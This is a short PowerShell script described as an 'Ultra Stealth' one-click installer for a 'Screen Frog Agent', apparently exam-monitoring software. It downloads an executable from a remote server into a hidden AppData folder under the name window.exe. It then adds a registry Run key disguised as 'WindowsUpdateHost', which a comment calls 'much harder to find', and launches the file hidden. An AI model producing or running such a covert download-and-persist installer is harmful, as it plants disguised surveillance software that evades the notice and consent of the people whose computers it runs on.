# Screen Frog Agent - Ultra Stealth One-Click Installer
# This script DOWNLOADS, INSTALLS, and PERSISTS the agent in deep stealth.

# --- CONFIGURATION ---
$ServerUrl   = "https://exam-system-v1.onrender.com"
$DownloadUrl = "$ServerUrl/download/agent"
$InstallDir  = "$env:APPDATA\Microsoft\Windows\WinNet" # Deep inconspicuous path
$AgentExe    = "window.exe"
$TargetPath  = Join-Path $InstallDir $AgentExe

# 1. Create Installation Directory
if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# 2. Download Agent Executable
try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $TargetPath -ErrorAction Stop
} catch {
    exit
}

# 3. Persistence: Add to Registry (HKCU\Run) - Much harder to find than Startup folder
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RegName = "WindowsUpdateHost"
Set-ItemProperty -Path $RegPath -Name $RegName -Value "`"$TargetPath`"" -Force

# 4. Cleanup old methods (if exists)
$OldStartupLnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ScreenFrogAgent.lnk"
if (Test-Path $OldStartupLnk) { Remove-Item $OldStartupLnk -Force }

# 5. Launch hidden
Start-Process $TargetPath
